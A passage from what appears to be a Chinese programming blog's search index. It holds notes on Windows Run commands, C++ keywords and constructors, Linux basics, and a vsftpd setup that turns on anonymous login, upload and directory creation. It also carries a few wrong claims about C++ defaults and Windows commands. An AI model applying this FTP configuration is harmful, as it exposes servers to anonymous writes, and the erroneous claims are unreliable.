diskmgmt.msc—磁盘管理实用程序 dcomcnfg-------打开系统组件服务 ddeshare-------打开DDE共享设置 dvdplay--------DVD播放器 net stop messenger-----停止信使服务 net start messenger----开始信使服务 notepad--------打开记事本 nslookup-------网络管理的工具向导 ntbackup-------系统备份和还原 narrator-------屏幕“讲述人” ntmsmgr.msc----移动存储管理器 ntmsoprq.msc—移动存储管理员操作请求 netstat -an----(TC)命令检查接口 syncapp--------创建一个公文包 sysedit--------系统配置编辑器 sigverif-------文件签名验证程序 sndrec32-------录音机 shrpubw--------创建共享文件夹 secpol.msc-----本地安全策略 syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 services.msc—本地服务设置 Sndvol32-------音量控制程序 sfc.exe--------系统文件检查器 sfc /scannow—windows文件保护 tsshutdn-------60秒倒计时关机命令 tsshutdn-------60秒倒计时关机命令 tourstart------xp简介（安装完成后出现的漫游xp程序） taskmgr--------任务管理器 eventvwr-------事件查看器 eudcedit-------造字程序 explorer-------打开资源管理器 packager-------对象包装程序 perfmon.msc----计算机性能监测程序 progman--------程序管理器 regedit.exe----注册表 rsop.msc-------组策略结果集 regedt32-------注册表编辑器 rononce -p ----15秒关机 regsvr32 /u *.dll----停止dll文件运行 regsvr32 /u zipfldr.dll------取消ZIP支持 cmd.exe--------CMD命令提示符 chkdsk.exe-----Chkdsk磁盘检查 certmgr.msc----证书管理实用程序 calc-----------启动计算器 charmap--------启动字符映射表 cliconfg-------SQL SERVER 客户端网络实用程序 Clipbrd--------剪贴板查看器 conf-----------启动netmeeting compmgmt.msc—计算机管理 cleanmgr-------垃圾整理 ciadv.msc------索引服务程序 osk------------打开屏幕键盘 odbcad32-------ODBC数据源管理器 oobe/msoobe /a----检查XP是否激活 lusrmgr.msc----本机用户和组 logoff---------注销命令 iexpress-------木马捆绑工具，系统自带 Nslookup-------IP地址侦测器 fsmgmt.msc-----共享文件夹管理器 utilman--------辅助工具管理器 gpedit.msc-----组策略 explorer-------打开资源管理器","categories":[{"name":"Windows命令","slug":"Windows命令","permalink":"https://xiaowuyoucy.github.io/categories/Windows命令/"}],"tags":[]},{"title":"cpp单词","slug":"bcck01cpp单词","date":"2021-04-28T13:58:43.000Z","updated":"2021-04-28T15:19:07.559Z","comments":true,"path":"2021/04/28/bcck01cpp单词/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/28/bcck01cpp单词/","excerpt":"","text":"day 1 asm auto bool break case catch ​ char class operator const const_cast continue default delete do double dynamic_cast ​ else enum explicit export extern false float for friend ​ goto if inline int long mutable ​ namespace new private protected ​ public register reinterpret_cast return short signed ​ sizeof static static_cast struct switch template this throw ​ true try typedef typeid typename union unsigned using virtual ​ void volatile ​ wchar_t 1. asm asm (指令字符串)：允许在 C++ 程序中嵌入汇编代码。 2. auto auto（自动，automatic）是存储类型标识符，表明变量&quot;自动&quot;具有本地范围，块范围的变量声明（如for循环体内的变量声明）默认为auto存储类型。 3. bool bool（布尔）类型，C++ 中的基本数据结构，其值可选为 true（真）或者 false（假）。C++ 中的 bool 类型可以和 int 混用，具体来说就是 0 代表 false，非 0 代表 true。bool 类型常用于条件判断和函数返回值。 4. break break（中断、跳出），用在switch语句或者循环语句中。程序遇到 break 后，即跳过该程序段，继续后面的语句执行。 5. case 用于 switch 语句中，用于判断不同的条件类型。 6. catch catch 和 try 语句一起用于异常处理。 7. char char（字符，character）类型，C++ 中的基本数据结构，其值一般为 0~255 的 int。这 256 个字符对应着 256 个 ASCII 码。char 类型的数据需要用单引号 ’ 括起来。 8.class class（类）是 C++ 面向对象设计的基础。使用 class 关键字声明一个类。 9. const const（常量的，constant）所修饰的对象或变量不能被改变，修饰函数时，该函数不能改变在该函数外面声明的变量也不能调用任何非const函数。在函数的声明与定义时都要加上const，放在函数参数列表的最后一个括号后。在 C++ 中，用 const 声明一个变量，意味着该变量就是一个带类型的常量，可以代替 #define，且比 #define 多一个类型信息，且它执行内链接，可放在头文件中声明；但在 C 中，其声明则必须放在源文件（即 .C 文件）中，在 C 中 const 声明一个变量，除了不能改变其值外，它仍是一具变量。如: 123const double pi(3.14159);或 const double pi = 3.14159; 10. const_cast用法： 1const_cast&lt;type_id&gt; (expression) 该运算符用来修改类型的 const 或 volatile 属性。除了 const 或 volatile 修饰之外， type_id 和 expression 的类型是一样的。常量指针被转化成非常量指针，并且仍然指向原来的对象；常量引用被转换成非常量引用，并且仍然指向原来的对象；常量对象被转换成非常量对象。 11. continue continue（继续）关键字用于循环结构。它使程序跳过代码段后部的部分，与 break 不同的是，continue 不是进入代码段后的部分执行，而是重新开始新的循环。因而它是&quot;继续循环&quot;之意，不是 break（跳出）。 12. default default（默认、缺省）用于 switch 语句。当 switch 所有的 case 都不满足时，将进入 default 执行。default 只能放在 switch 语句所有的 case 之后，并且是可选的。 13. delete delete（删除）释放程序动态申请的内存空间。delete 后面通常是一个指针或者数组 []，并且只能 delete 通过 new 关键字申请的指针，否则会发生段错误。 14. do do-while是一类循环结构。与while循环不同，do-while循环保证至少要进入循环体一次。 15. double double（双精度）类型，C++ 中的基本数据结构，以双精度形式存储一个浮点数。 16. dynamic_cast dynamic_cast（动态转换），允许在运行时刻进行类型转换，从而使程序能够在一个类层次结构安全地转换类型。dynamic_cast 提供了两种转换方式，把基类指针转换成派生类指针，或者把指向基类的左值转换成派生类的引用。 17. else else 紧跟在 if 后面，用于对 if 不成立的情况的选择。 18. enum enum（枚举）类型，给出一系列固定的值，只能在这里面进行选择一个。 19. explicit explicit（显式的）的作用是&quot;禁止单参数构造函数&quot;被用于自动型别转换，其中比较典型的例子就是容器类型。在这种类型的构造函数中你可以将初始长度作为参数传递给构造函数。 20. export 为了访问其他编译单元（如另一代码文件）中的变量或对象，对普通类型（包括基本数据类、结构和类），可以利用关键字 extern，来使用这些变量或对象时；但是对模板类型，则必须在定义这些模板类对象和模板函数时，使用标准 C++ 新增加的关键字 export（导出）。 21. extern extern（外部的）声明变量或函数为外部链接，即该变量或函数名在其它文件中可见。被其修饰的变量（外部变量）是静态分配空间的，即程序开始时分配，结束时释放。用其声明的变量或函数应该在别的文件或同一文件的其它地方定义（实现）。在文件内声明一个变量或函数默认为可被外部使用。在 C++ 中，还可用来指定使用另一语言进行链接，这时需要与特定的转换符一起使用。目前仅支持 C 转换标记，来支持 C 编译器链接。使用这种情况有两种形式： 123extern &quot;C&quot; 声明语句extern &quot;C&quot; &#123; 声明语句块 &#125; 22. false false（假的），C++ 的基本数据结构 bool 类型的值之一。等同于 int 的 0 值。 23. float float（浮点数），C++ 中的基本数据结构，精度小于 double。 24. for for 是 C++ 中的循环结构之一。 25. friend friend（友元）声明友元关系。友元可以访问与其有 friend 关系的类中的 private/protected 成员，通过友元直接访问类中的 private/protected 成员的主要目的是提高效率。友元包括友元函数和友元类。 26. goto goto（转到），用于无条件跳转到某一标号处开始执行。 27. if if（如果），C++ 中的条件语句之一，可以根据后面的 bool 类型的值选择进入一个分支执行。 28. inline inline（内联）函数的定义将在编译时在调用处展开。inline 函数一般由短小的语句组成，可以提高程序效率。 29. int int（整型，integer），C++ 中的基本数据结构，用于表示整数，精度小于 long。 30. long long（长整型，long integer），C++ 中的基本数据结构，用于表示长整数。 31. mutable mutable（易变的）是 C++ 中一个不常用的关键字。只能用于类的非静态和非常量数据成员。由于一个对象的状态由该对象的非静态数据成员决定，所以随着数据成员的改变，对像的状态也会随之发生变化。如果一个类的成员函数被声明为 const 类型，表示该函数不会改变对象的状态，也就是该函数不会修改类的非静态数据成员。但是有些时候需要在该类函数中对类的数据成员进行赋值，这个时候就需要用到 mutable 关键字。 32. namespace namespace（命名空间）用于在逻辑上组织类，是一种比类大的结构。 33. new new（新建）用于新建一个对象。new 运算符总是返回一个指针。由 new 创建 34. operator operator（操作符）用于操作符重载。这是 C++ 中的一种特殊的函数。 35. private private（私有的），C++ 中的访问控制符。被标明为 private 的字段只能在本类以及友元中访问。 36. protected protected（受保护的），C++ 中的访问控制符。被标明为 protected 的字段只能在本类以及其继承类和友元中访问。 37. public public（公有的），C++ 中的访问控制符。被标明为 public 的字段可以在任何类 38.register register（寄存器）声明的变量称着寄存器变量，在可能的情况下会直接存放在机器的寄存器中；但对 32 位编译器不起作用，当 global optimizations（全局优化）开的时候，它会做出选择是否放在自己的寄存器中；不过其它与 register 关键字有关的其它符号都对32位编译器有效。 39. reinterpret_cast 用法： 1reinpreter_cast&lt;type-id&gt; (expression) type-id 必须是一个指针、引用、算术类型、函数指针或者成员指针。它可以把一个指针转换成一个整数，也可以把一个整数转换成一个指针（先把一个指针转换成一个整数，在把该整数转换成原类型的指针，还可以得到原先的指针值）。 40. return return（返回）用于在函数中返回值。程序在执行到 return 语句后立即返回，return 后面的语句无法执行到。 41. short short（短整型，short integer），C++ 中的基本数据结构，用于表示整数，精度小于 int。 42. signed signed（有符号），表明该类型是有符号数，和 unsigned 相反。数字类型（整型和浮点型）都可以用 signed 修饰。但默认就是 signed，所以一般不会显式使用。 43. sizeof 由于 C++ 每种类型的大小都是由编译器自行决定的，为了增加可移植性，可以用 sizeof 运算符获得该数据类型占用的字节数。 44. static static（静态的）静态变量作用范围在一个文件内，程序开始时分配空间，结束时释放空间，默认初始化为 0，使用时可改变其值。静态变量或静态函数，只有本文件内的代码才可访问它，它的名字（变量名或函数名）在其它文件中不可见。因此也称为&quot;文件作用域&quot;。在 C++ 类的成员变量被声明为 static（称为静态成员变量），意味着它被该类的所有实例所共享，也就是说当某个类的实例修改了该静态成员变量，其修改值为该类的其它所有实例所见；而类的静态成员函数也只能访问静态成员（变量或函数）。类的静态成员变量必须在声明它的文件范围内进行初始化才能使用，private 类型的也不例外。 45. static_cast 用法： 1static_cast &lt; type-id &gt; ( expression ) 该运算符把 expression 转换为 type-id 类型，但没有运行时类型检查来保证转换的安全性。它主要有如下几种用法： ① 用于类层次结构中基类和子类之间指针或引用的转换。进行上行转换（把子类的指针或引用转换成基类表示）是安全的；进行下行转换（把基类指针或引用转换成子类表示）时，由于没有动态类型检查，所以是不安全的。 ② 用于基本数据类型之间的转换，如把 int 转换成 char，把 int 转换成 enum。这种转换的安全性也要开发人员来保证。 ③ 把空指针转换成目标类型的空指针。 ④ 把任何类型的表达式转换成void类? 注意 static_cast 不能转换掉 expression 的 const、volitale、或者 __unaligned 属性。 46. struct struct（结构）类型，类似于 class 关键字，与 C 语言兼容（class 关键字是不与 C 语言兼容的），可以实现面向对象程序设计。 47. switch switch（转换）类似于 if-else-if 语句，是一种多分枝语句。它提供了一种简洁的书写，并且能够生成效率更好的代码。但是，switch 后面的判断只能是int（char也可以，但char本质上也是一种int类型）。switch 语句最后的 default 分支是可选的。 48. template template（模板），C++ 中泛型机制的实现。 49. this this 返回调用者本身的指针。 50. throw throw（抛出）用于实现 C++ 的异常处理机制，可以通过 throw 关键字&quot;抛出&quot;一个异常。 51. true true（真的），C++ 的基本数据结构 bool 类型的值之一。等同于 int 的非 0 值。 52. try try（尝试）用于实现 C++ 的异常处理机制。可以在 try 中调用可能抛出异常的函数，然后在 try 后面的 catch 中捕获并进行处理。 53. typedef typedef（类型定义，type define），其格式为： 1typedef 类型 定义名; 类型说明定义了一个数据类型的新名字而不是定义一种新的数据类型。定义名表示这个类型的新名字。 54. typeid 指出指针或引用指向的对象的实际派生类型。 55. typename typename（类型名字）关键字告诉编译器把一个特殊的名字解释成一个类型。在下列情况下必须对一个 name 使用 typename 关键字： 1． 一个唯一的name（可以作为类型理解），它嵌套在另一个类型中的。 2． 依赖于一个模板参数，就是说：模板参数在某种程度上包含这个name。当模板参数使编译器在指认一个类型时产生了误解。 56. union union（联合），类似于 enum。不同的是 enum 实质上是 int 类型的，而 union 可以用于所有类型，并且其占用空间是随着实际类型大小变化的。 57. unsigned unsigned（无符号），表明该类型是无符号数，和 signed 相反。 58. using 表明使用 namespace。 59. virtual virtual（虚的），C++ 中用来实现多态机制。 60. void void（空的），可以作为函数返回值，表明不返回任何数据；可以作为参数，表明没有参数传入（C++中不是必须的）；可以作为指针使用。 61. volatile volatile（不稳定的）限定一个对象可被外部进程（操作系统、硬件或并发线程等）改变，声明时的语法如下： 1int volatile nVint; 这样的声明是不能达到最高效的，因为它们的值随时会改变，系统在需要时会经常读写这个对象的值。因此常用于像中断处理程序之类的异步进程进行内存单元访问。 62. wchar_t wchar_t 是宽字符类型，每个 wchar_t 类型占 2 个字节，16 位宽。汉字的表示就要用到 wchar_t。","categories":[{"name":"编程词汇","slug":"编程词汇","permalink":"https://xiaowuyoucy.github.io/categories/编程词汇/"}],"tags":[]},{"title":"linux1-3","slug":"linux002-1-3","date":"2021-04-28T13:17:57.000Z","updated":"2021-04-28T13:54:38.465Z","comments":true,"path":"2021/04/28/linux002-1-3/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/28/linux002-1-3/","excerpt":"","text":"快捷键 目录 ls和tree的使用 文件目录和文件的创建 删除目录和文件 文件和目录的拷贝 查看文件内容 mv命令 文件的检索 od 查看二进制文件 软件的安装和卸载 U盘挂载和卸载 ftp服务器配置 vsftpd 终端：(虚拟终端) 所有输入输出设备总称 shell： 命令解析器 bash： bore again shell 命令解析器。 快捷键: 命令和路径补齐: tab 主键盘快捷键: ​ 1).历史命令切换: ​ 历史命令:history ​ 向上遍历: ctrl + p ​ 向下遍历: ctrl + n 2).光标移动: 向左: ctrl + b 向右: ctrl + f 移动到头部: ctrl + a 移动到尾部: ctrl + e 3).删除字符: 删除光标后边的字符: ctrl + d 删除光标前面的字符: ctrl + h 删除光标前面的所有内容: ctrl + u 目录 / 根目录 ls / /bin 常用的命令 cd /bin 进入bin目录 /boot 开机启动项文件 /dev 设备文件 /etc 配置文件 /home 主目录,存放用户 /lib 动态链接库(共享库) /lost-found 存放文件碎片 /media 挂载外设 U盘或光盘等等 /mnt 手动挂载外设到这个目录 /opt 第三方软件 /root 超级用户目录 /sbin 管理员使用的系统管理程序 /usr 用户软件资源目录(用户的软件或文件) /usr/bin 系统用户的应用程序 /usr/sbin 超级用户使用的管理程序和系统守护程序 /usr/src 内核源码默认的放置目录 ctrl + l 清屏,或clear 绝对路径 从/开始 相对路径 ./当前路径 …/上一级路径 cd - 两个相邻目录切换 cd ~ 切换到当前用户目录 cd 切换到用户目录 yxc19981c@yc:~$ yxc19981c 用户名 yc 主机名 ~ 用户目录 $普通用户 超级用户root 切换到超级用户 sudo su 或 su root - rw- r– r– 1 root root 1937 9月 2 2020 ucontext.h 文件类型 所有者 所属组 其他人 硬连接数 文件所有者 文件所属组 文件大小 日期 文件名 文件类型： 文件 “-” 目录 “d” 软连接 “l” --快捷方式 管道 “p” 套接字 “s” 字符设备 “c” 块设备 “b” 未知类型 ls和tree的使用: ls -a 显示所有文件 ls -l 详细显示 ls -al ls -h 人性化显示文件大小 tree 目录 pwd 查看当前位置 文件目录和文件的创建 mkdir 目录名 mkdir dri/dir/dir -p 递归创建目录 mkdir -p dir/dir/dir touch 文件名 touch 文件名1 文件名2 … 文件名n 删除目录和文件 ​ rmdir 空目录名 rm 目录名 -rf (f代表不提示) ​ rm 文件名 -f rm 目录名 -ri (i代表提示) ​ 文件和目录的拷贝 cp 源文件 目标文件名 cp h1 h2 将h1复制一份并命名为h2 如果h2存在将原来内容覆盖 cp 源目录 目的目录 -r 如果目的目录不存在就将源码目拷贝一份并命名为目的目录 如果目的目录存在,就将源目录拷贝一份,复制到目的目录里面 查看文件内容 gedit 文件名 cat 文件名 cat 文件1 文件2 … 文件n 拼接查看文件 cat 文件1 | more more 文件名 回车 一行 空格 一页 只能往后看 q 退出 ctrl + c 退出 less 文件名 回车 一行 空格 一页 可以往前后看 q 退出 ctrl + c 退出 ctrl + p 向前一行 ctrl + n 先后一行 head 文件名 显示文件前十行 head -5 文件名 显示文件前五行 tail 文件名 显示文件后十行 tail -5 文件名 显示文件后五行 mv命令 文件改名 mv 源文件 改名后的文件 移动 ​ mv 文件名 目录名 将文件移动到目录中 文件的检索 grep -r “文件内容” 路径 -r代表递归检索文件 grep -r “printf” / 从根目录开始递归查找文件包含&quot;printf&quot;内容的文件 文件和目录属性命令 wc 获取文本文件的信息 yxsdc19c@yscc:/usr/include$ wc time.h 309 1515 10360 time.h 309代表行数 1515代表单词个数 10360代表字节数 od 查看二进制文件 od -t 文件名 -t 指定数据的显示格式 -tc ASCII字符 -tx 十六进制数 -td 有符号十进制数 -tu 无符号十进制数 -to 八进制数 -tf 浮点数 软件的安装和卸载 在线安装 安装 sudo apt-get install 软件名 卸载 sudo apt-get remove 软件名 更新 sudo apt-get update 更新软件列表 软件列表存放的是软件名字和下载地址 清理所有软件安装包 sudo apt-get clean 实际清理的是: /var/cache/apt/archives目录下的.deb文件 deb包安装 安装 sudo dpkg -i xxx.deb 卸载 sudo dpkg -r xxx 源码安装 1.解压缩源代码包 2.进入到安装目录 3.检测文件是否缺失,创建Makefile,检测编译环境: ./configure 4.编译源码 生成库和可以执行程序:make 5.把库和可执行程序,安装到系统目录下: sudo make install 6.删除和卸载软件:sudo make distclean 7.上述安装步骤并不是绝对的,应该先查看附带的README文件 U盘挂载和卸载 卸载: umount 设备文件名 挂载: mount 设备文件名 挂载路径 将外设挂载到非mnt目录时,会临时覆盖原来内容,卸载之后会恢复 ftp服务器配置 vsftpd 作用:文件上传和下载 ftp服务器配置 配置文件在/etc/vsftpd.conf anonymous_enable=YES 允许匿名用户登录 write_enable=YES 实名登录用户拥有写的权限 local_umask=022 设置本地掩码为022 anon_upload_enable=YES 匿名用户拥有写的权限 anon_mkdir_write_enable=YES 匿名用户可以在ftp服务器上创建目录 重启ftp服务 ​ sudo service vsftpd restart 实名登录ftp ftp ip地址 输入用户 输入密码 退出 bye quit exit 文件上传和下载 上传 在什么目录登录的,文件默认从那里找 put 文件名 下载 get 文件名 不允许操作目录,可以打包处理 匿名登录服务器 用户名 anonymous 不允许匿名用户在任意目录直接切换 只能在一个指定的目录范围内工作 需要在ftp服务器上创建一个匿名用户的目录 --匿名用户的根目录 在配置文件添加 anon_root=/home/yxc19980620c/myFtp/ 匿名登录默认路径是在/srv/ftp 在配置文件/etc/passwd可以查看并修改 ftp:x:123:127:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"类中默认函数的隐藏条件","slug":"cpp0022-类中默认函数的隐藏条件","date":"2021-04-26T13:22:10.000Z","updated":"2021-12-28T18:35:51.935Z","comments":true,"path":"2021/04/26/cpp0022-类中默认函数的隐藏条件/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0022-类中默认函数的隐藏条件/","excerpt":"","text":"类中默认函数的隐藏条件 编译器不提供默认无参构造函数的条件: 1.显示的提供一个有参或无参构造函数 2.显示的提供一个拷贝构造函数 编译器不提供默认拷贝构造函数的条件 1.显示的提供一个拷贝构造函数 编译器不提供析构函数的条件 1.显示的提供了一个析构函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class B&#123;public: /* 默认提供的函数 B() &#123; //默认的无惨构造函数 &#125; B(const B&amp; b) &#123; m_b = b.m_b; //默认的拷贝构造函数 p = b.p; &#125; ~B() &#123; //默认的析构函数 &#125; */ //如果显示的写了一个普通构造函数， 会隐藏默认的无惨构造函数 //如果显示的写了一个拷贝构造函数 ，会隐藏默认的无参构造函数和默认的拷贝构造函数 //如果显示的写了一个析构函数， 会隐藏默认的析构函数 B(const B&amp; b) &#123; &#125;private: int m_b; char *p;&#125;;class A&#123;public: /* 默认的构造函数 如果普通构造函数，提供了一个显示的构造， 那么这个无参的默认构造就会被隐藏。 不会把拷贝构造函数隐藏掉 A() &#123; &#125; */ A(int a) &#123; m_a = a; &#125; /* 默认的拷贝构造函数 A(const A &amp; a) &#123; m_a = a; &#125; */ //显示的提供一个拷贝构造的函数的时候，默认的拷贝构造函数就会被隐藏 A(const A &amp;a) &#123; cout &lt;&lt; \"显示提供的拷贝构造函数\" &lt;&lt; endl; m_a = a.m_a; &#125; /* 默认的析构函数 ~A() &#123; &#125; */ //只有提供一个显示的析构函数，才会将默认的析构覆盖点 ~A() &#123; cout &lt;&lt; \"A的析构函数 调用 \" &lt;&lt; endl; &#125;private: int m_a;&#125;;int main(void)&#123; A aObj(10); //当你不提供任何构造函数的时候， 系统会有一个默认的构造函数 A aObj2 = aObj; //调用了aObj2的拷贝构造函数 //A aObj2(aObj); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"深拷贝和浅拷贝","slug":"cpp0023-深拷贝和浅拷贝","date":"2021-04-26T13:22:10.000Z","updated":"2021-12-28T18:35:54.698Z","comments":true,"path":"2021/04/26/cpp0023-深拷贝和浅拷贝/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0023-深拷贝和浅拷贝/","excerpt":"","text":"深拷贝和浅拷贝 字符串如果进行浅拷贝会出现以下问题: 假设有两个char类型指针a,b指向同一个内存空间 当a被释放时,b还未修改,再次使用b时就会出现段错误(Linux)或内存中断(windows) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include&lt;iostream&gt;using namespace std;class Teacher &#123;public: Teacher() &#123; m_id = 0; m_name = NULL; &#125; //有参构造函数,开辟一个空间给m_name Teacher(int id,const char * name) &#123; int len = strlen(name); m_name = (char *)malloc(len + 1); strcpy(m_name, name); m_id = id; &#125; //拷贝构造函数,开辟一个空间 Teacher(const Teacher &amp; another) &#123; cout &lt;&lt; \"Teacher(const Teacher &amp; another)..\" &lt;&lt; endl; int len = strlen(another.m_name); this-&gt;m_name = (char *)malloc(len + 1); strcpy(this-&gt;m_name, another.m_name); this-&gt;m_id = another.m_id; &#125; //打印id 和name和name的地址 void print() &#123; cout &lt;&lt; m_id &lt;&lt; endl; cout &lt;&lt; m_name &lt;&lt; endl; cout &lt;&lt; (int *)m_name &lt;&lt; endl; cout &lt;&lt; \"================================================\" &lt;&lt; endl; &#125; //释放从堆区开辟的内存 ~Teacher() &#123; if (m_name != NULL) &#123; cout &lt;&lt; m_name &lt;&lt; \" \"; free(m_name); m_name = NULL; cout &lt;&lt; \"free\" &lt;&lt; endl; cout &lt;&lt; \"================================================\" &lt;&lt;endl; &#125; &#125;private: int m_id; char * m_name;&#125;;void test1()&#123; Teacher tc1(123, \"xiaoh\"); Teacher tc2(tc1); tc1.print(); tc2.print();&#125;int main(int argc, char* argv[])&#123; test1(); return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"拷贝构造函数","slug":"cpp0021-拷贝构造函数","date":"2021-04-26T12:41:44.000Z","updated":"2021-12-28T18:35:47.607Z","comments":true,"path":"2021/04/26/cpp0021-拷贝构造函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0021-拷贝构造函数/","excerpt":"","text":"拷贝构造函数 编译器会默认提供一个浅拷贝的构造函数 一旦手动提供了一个拷贝构造函数,编译器将不再提供默认的拷贝构造函数 1234567class 类名&#123; 类名(const 类名 &amp; another) &#123; 拷⻉贝构造体 &#125;&#125; 1234567class A&#123; A(const A &amp; another) &#123; &#125;&#125; test.h 12345678910111213141516171819#pragma onceclass test&#123;public: test(); test(int a,int b); test(int a); //拷贝构造函数 test(const test &amp; another); //赋值操作符函数 void operator=(const test &amp; another); ~test(); void print();private: int mA; int mB;&#125;; test.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include \"test.h\"#include&lt;iostream&gt;using namespace std;test::test()&#123; mA = 0; mB = 0;&#125;test::test(int a, int b)&#123; mA = a; mB = b;&#125;test::test(int a)&#123; mA = a; mB = 0;&#125;test::test(const test &amp; another)&#123; mA = another.mA; mB = another.mB; cout &lt;&lt; \"我是拷贝构造函数\" &lt;&lt; endl;&#125;void test::operator=(const test &amp; another)&#123; mA = another.mA; mB = another.mB; cout &lt;&lt; \"我是赋值操作符函数\" &lt;&lt; endl;&#125;test::~test()&#123; cout &lt;&lt; \"~test\" &lt;&lt; endl;&#125;void test::print()&#123; cout &lt;&lt; mA &lt;&lt; endl; cout &lt;&lt; mB &lt;&lt; endl; &#125; main.cpp 12345678910111213#include&lt;iostream&gt;#include\"test.h\"using namespace std;int main(int argc, char* argv[])&#123; test t1(100, 200); test t2(111); test t3(t2);//调用拷贝构造函数 test t4 = t3;//这里调用的是拷贝构造函数,因为是初始化 t4 = t2; //这里是调用赋值操作符函数,因为不是初始化 return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"默认的无参构造和析构函数","slug":"cpp0020-默认的无参构造和析构函数","date":"2021-04-26T12:32:36.000Z","updated":"2021-12-28T18:35:42.904Z","comments":true,"path":"2021/04/26/cpp0020-默认的无参构造和析构函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0020-默认的无参构造和析构函数/","excerpt":"","text":"默认的无参构造和析构函数 不写构造函数时,编译器会默认提供一个无参构造函数 如果显示的提供了一个构造函数,编译器将不再提供无参构造函数 如果显示提供了一个析构函数,编译器将不再提供构造函数 如果手动添加了一个有参构造函数,就需要根据情况添加一个无参构造函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class Test&#123;public: //默认构造函数。 就是一个无参数的构造函数， //如果不显示提供构造函数，系统就是调用默认的构造函数 /* Test() &#123;&#125; 默认的构造函数，已经手动提供，默认就被隐藏 */ //如果我们提供了一个显示的构造函数，那么默认的构造函数就被隐藏掉了。 //构造函数一旦手动提供， 默认将不复存在。 Test(int x, int y) &#123; m_x = x; m_y = y; cout &lt;&lt; \"调用了有参数的构造函数\" &lt;&lt; endl; &#125; //无参数的构造函数 Test()&#123; m_x = 0; m_y = 0; cout &lt;&lt; \"调用了无参数的构造函数\" &lt;&lt; endl; &#125; //拷贝构造函数 ，想通过另一个Test对象 another 将本对象进行拷贝 Test(const Test &amp; another) &#123; m_x = another.m_x; m_y = another.m_y; cout &lt;&lt; \"调用了拷贝构造函数\" &lt;&lt; endl; &#125; //等号操作符 void operator = (const Test &amp;t) &#123; m_x = t.m_x; m_y = t.m_y; &#125; void printT() &#123; cout &lt;&lt; \"x : \" &lt;&lt; m_x &lt;&lt; \", y : \" &lt;&lt; m_y &lt;&lt; endl; &#125; //提供一个析构函数 ~Test() &#123; cout &lt;&lt; \"~Test（）析构函数被执行了\" &lt;&lt; endl; cout &lt;&lt; \"(\" &lt;&lt; m_x &lt;&lt; \", \" &lt;&lt; m_y &lt;&lt; \")\" &lt;&lt; \"被析构了\" &lt;&lt; endl; &#125; private: int m_x; int m_y;&#125;;int main(void)&#123; Test t1; //调用无参的构造函数 Test t2(10, 20); //Test t3(10, 20, 30); t2.printT(); Test t3(t2); //调用t3的拷贝构造函数 //调用拷贝构造函数的方式 t3.printT(); //Test t4 = t2; // 依然是调用t4的拷贝构造函数， Test t4(100, 200); //调用t4 的两个参数的构造函数 Test t5; //先调用无惨构造。 t5 = t2; //不会调用拷贝构造函数 //调用=号重载操作符 赋值操作符 //析构函数的调用顺序， 跟对象的构造顺序相反， 谁先构造，谁最后一个被析构。 return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"构造和析构","slug":"cpp0019-构造和析构","date":"2021-04-26T12:09:33.000Z","updated":"2021-12-28T18:35:39.162Z","comments":true,"path":"2021/04/26/cpp0019-构造和析构/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/26/cpp0019-构造和析构/","excerpt":"","text":"构造和析构 构造函数 定义 C++中的类可以定义与类名相同的特殊成员函数，这种与类名相同的成员函数叫做构造函数. 1234567class 类名&#123; 类名(形式参数) &#123; 构造体 &#125;&#125; 123456class A&#123; A(形参) &#123; &#125;&#125; 调用 自动调用：一般情况下C++编译器会自动调用构造函数. 手动调用：在一些情况下则需要手工调用构造函数. 规则: 1 在对象创建时自动调用,完成初始化相关工作。 2 无返回值,与类名同,默认无参,可以重载,可默认参数。 3 一经实现,默认不复存在。 析构函数 定义 C++中的类可以定义一个特殊的成员函数清理对象，这个特殊的成员函数叫做析构函数. 1234567891011121314151617class 类名&#123; ~类名() &#123; 析构体 &#125;&#125;//--------------------------------------------class A&#123; ~A() &#123; &#125;&#125; 规则: 1 对象销毁时,自动调用。完成销毁的善后工作。 2 无返值 ,与类名同。无参。不可以重载与默认参数 析构函数的作用,并不是删除对象,而在对象销毁前完成的一些清理工作。 test.h 12345678910111213#pragma onceclass test&#123;public: test(); test(int a,int b); test(int a); ~test(); void print();private: int mA; int mB;&#125;; test.cpp 12345678910111213141516171819202122232425262728293031323334#include \"test.h\"#include&lt;iostream&gt;using namespace std;test::test()&#123; mA = 0; mB = 0;&#125;test::test(int a, int b)&#123; mA = a; mB = b;&#125;test::test(int a)&#123; mA = a; mB = 0;&#125;test::~test()&#123; cout &lt;&lt; \"~test\" &lt;&lt; endl;&#125;void test::print()&#123; cout &lt;&lt; mA &lt;&lt; endl; cout &lt;&lt; mB &lt;&lt; endl; &#125; main.cpp 12345678910111213#include&lt;iostream&gt;#include\"test.h\"using namespace std;int main(int argc, char* argv[])&#123; test t1(100, 200); test t2(111); t1.print(); t2.print(); return 